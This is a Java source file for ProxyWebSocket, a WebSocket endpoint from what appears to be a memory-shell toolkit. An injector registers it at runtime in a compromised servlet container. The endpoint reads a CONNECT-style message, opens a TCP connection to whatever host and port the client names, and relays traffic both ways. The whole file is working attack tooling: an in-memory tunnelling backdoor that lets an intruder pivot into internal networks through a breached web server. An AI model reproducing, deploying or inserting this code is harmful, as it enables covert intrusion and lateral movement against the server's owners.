package com.reajason.javaweb.memshell.shelltool.wsproxy;

import javax.websocket.Endpoint;
import javax.websocket.EndpointConfig;
import javax.websocket.MessageHandler;
import javax.websocket.Session;
import javax.websocket.CloseReason;
import java.io.IOException;
import java.net.InetSocketAddress;
import java.nio.ByteBuffer;
import java.nio.channels.AsynchronousSocketChannel;
import java.nio.channels.CompletionHandler;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.Future;
import java.util.concurrent.ThreadFactory;
import java.util.concurrent.TimeUnit;

/**
 * JSR-356 Endpoint 版本，由注入器从 ServletContext 取 {@code ServerContainer} 后注册。
 *
 * @author ReaJason
 * @since 2026/1/14
 */
public class ProxyWebSocket extends Endpoint implements MessageHandler.Whole<ByteBuffer>, CompletionHandler<Integer, Session>, Runnable, ThreadFactory {
    private static final int INIT = 0;
    private static final int CONNECTING = 1;
    private static final int TUNNEL = 2;
    private static final int CLOSED = 3;
    // 模板只生成当前类；线程工厂和连接任务由本类实现，不能依赖未打包的内部类。
    private static final ExecutorService CONNECT_EXECUTOR = Executors.newCachedThreadPool(new ProxyWebSocket());

    private volatile int state = INIT;
    private volatile Session session;
    private volatile AsynchronousSocketChannel currentClient;
    private String targetHost;
    private int targetPort;
    private final Object writeLock = new Object();
    private final List<ByteBuffer> pendingMessages = new ArrayList<ByteBuffer>();
    private final ByteBuffer buffer = ByteBuffer.allocate(32768);

    public ProxyWebSocket() {
    }

    AsynchronousSocketChannel openChannel() throws IOException {
        return AsynchronousSocketChannel.open();
    }

    @Override
    public Thread newThread(Runnable runnable) {
        Thread thread = new Thread(runnable, "proxy-websocket-connect");
        thread.setDaemon(true);
        return thread;
    }

    @Override
    public void run() {
        connect(session, targetHost, targetPort);
    }

    @Override
    public void onOpen(Session session, EndpointConfig endpointConfig) {
        synchronized (this) {
            this.state = INIT;
            this.session = session;
            session.addMessageHandler(this);
        }
    }

    private void readFromServer() {
        AsynchronousSocketChannel client = currentClient;
        Session channel = session;
        if (state == TUNNEL && client != null && client.isOpen() && channel != null && channel.isOpen()) {
            buffer.clear();
            client.read(buffer, channel, this);
        }
    }

    @Override
    public void onMessage(ByteBuffer message) {
        try {
            boolean startConnect = false;
            synchronized (this) {
                if (state == CONNECTING) {
                    pendingMessages.add(copy(message));
                    return;
                } else if (state == INIT) {
                    state = CONNECTING;
                    startConnect = true;
                } else if (state != TUNNEL) {
                    closeQuietly();
                    return;
                }
            }

            if (startConnect) {
                startConnect(session, message);
            } else {
                writeToTunnel(message);
            }
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
            closeQuietly();
        } catch (Exception e) {
            closeQuietly();
        }
    }

    private void startConnect(Session channel, ByteBuffer messageBuffer) {
        byte[] bytes = new byte[messageBuffer.remaining()];
        messageBuffer.get(bytes);
        String values = new String(bytes, StandardCharsets.ISO_8859_1);

        String[] array = values.split(" ");
        if (array.length < 2) {
            reject(channel, "400 Bad Request");
            return;
        }
        String address = array[1];
        int separator = address.lastIndexOf(':');
        if (separator <= 0 || separator == address.length() - 1) {
            reject(channel, "400 Bad Request");
            return;
        }

        String host = address.substring(0, separator);
        if (host.startsWith("[") || host.endsWith("]")) {
            if (!host.startsWith("[") || !host.endsWith("]") || host.length() <= 2) {
                reject(channel, "400 Bad Request");
                return;
            }
            host = host.substring(1, host.length() - 1);
        } else if (host.indexOf(':') >= 0) {
            reject(channel, "400 Bad Request");
            return;
        }

        final int port;
        try {
            port = Integer.parseInt(address.substring(separator + 1));
        } catch (NumberFormatException e) {
            reject(channel, "400 Bad Request");
            return;
        }
        if (port < 1 || port > 65535) {
            reject(channel, "400 Bad Request");
            return;
        }

        try {
            this.targetHost = host;
            this.targetPort = port;
            CONNECT_EXECUTOR.execute(this);
        } catch (RuntimeException e) {
            reject(channel, "503 Service Unavailable");
        }
    }

    private void connect(Session channel, String host, int port) {
        AsynchronousSocketChannel client = null;
        try {
            client = openChannel();
            synchronized (this) {
                if (state != CONNECTING || session != channel) {
                    closeChannel(client);
                    return;
                }
                currentClient = client;
            }
            Future<Void> future = client.connect(new InetSocketAddress(host, port));
            future.get(10, TimeUnit.SECONDS);
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
            connectFailed(channel, client);
            return;
        } catch (Exception e) {
            connectFailed(channel, client);
            return;
        }
        connected(channel, client);
    }

    private void connectFailed(Session channel, AsynchronousSocketChannel client) {
        synchronized (this) {
            if (state != CONNECTING || session != channel || currentClient != client) {
                closeChannel(client);
                return;
            }
        }
        reject(channel, "503 Service Unavailable");
    }

    private void connected(Session channel, AsynchronousSocketChannel client) {
        try {
            synchronized (writeLock) {
                List<ByteBuffer> pending;
                synchronized (this) {
                    if (state != CONNECTING || session != channel || currentClient != client) {
                        closeChannel(client);
                        return;
                    }
                    pending = new ArrayList<ByteBuffer>(pendingMessages);
                    pendingMessages.clear();
                    state = TUNNEL;
                }

                sendResponse(channel, "200 Connection Established");
                for (ByteBuffer message : pending) {
                    writeFully(message);
                }
            }
            readFromServer();
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
            closeQuietly();
        } catch (Exception e) {
            closeQuietly();
        }
    }

    private void writeToTunnel(ByteBuffer message) throws Exception {
        synchronized (writeLock) {
            if (state != TUNNEL || currentClient == null || !currentClient.isOpen()) {
                closeQuietly();
                return;
            }
            writeFully(message);
        }
    }

    private void writeFully(ByteBuffer buf) throws Exception {
        while (buf.hasRemaining()) {
            currentClient.write(buf).get();
        }
    }

    private static ByteBuffer copy(ByteBuffer message) {
        byte[] bytes = new byte[message.remaining()];
        message.get(bytes);
        return ByteBuffer.wrap(bytes);
    }

    @Override
    public void completed(Integer result, Session attachment) {
        if (result == -1) {
            closeQuietly();
            return;
        }

        try {
            if (result > 0) {
                buffer.flip();
                if (state == TUNNEL && attachment.isOpen()) {
                    attachment.getBasicRemote().sendBinary(buffer);
                }
            }
            readFromServer();
        } catch (Exception e) {
            closeQuietly();
        }
    }

    @Override
    public void failed(Throwable exc, Session attachment) {
        closeQuietly();
    }

    @Override
    public void onClose(Session session, CloseReason closeReason) {
        closeQuietly();
    }

    @Override
    public void onError(Session session, Throwable thr) {
        closeQuietly();
    }

    /**
     * 建连失败或 CONNECT 报文非法时，先给客户端一个 HTTP 语义的响应，再关闭会话。
     */
    private void reject(Session channel, String status) {
        synchronized (this) {
            if (state == CLOSED || session != channel) {
                return;
            }
            state = CLOSED;
            pendingMessages.clear();
        }
        try {
            sendResponse(channel, status);
        } catch (Exception ignored) {
        }
        closeResources();
    }

    private static void sendResponse(Session channel, String status) throws IOException {
        byte[] response = ("HTTP/1.1 " + status + "\r\n\r\n").getBytes(StandardCharsets.ISO_8859_1);
        channel.getBasicRemote().sendBinary(ByteBuffer.wrap(response));
    }

    private void closeQuietly() {
        synchronized (this) {
            state = CLOSED;
            pendingMessages.clear();
        }
        closeResources();
    }

    private void closeResources() {
        closeChannel(currentClient);
        try {
            if (session != null && session.isOpen()) {
                session.close();
            }
        } catch (Exception ignored) {
        }
    }

    private static void closeChannel(AsynchronousSocketChannel client) {
        try {
            if (client != null && client.isOpen()) {
                client.close();
            }
        } catch (Exception ignored) {
        }
    }
}
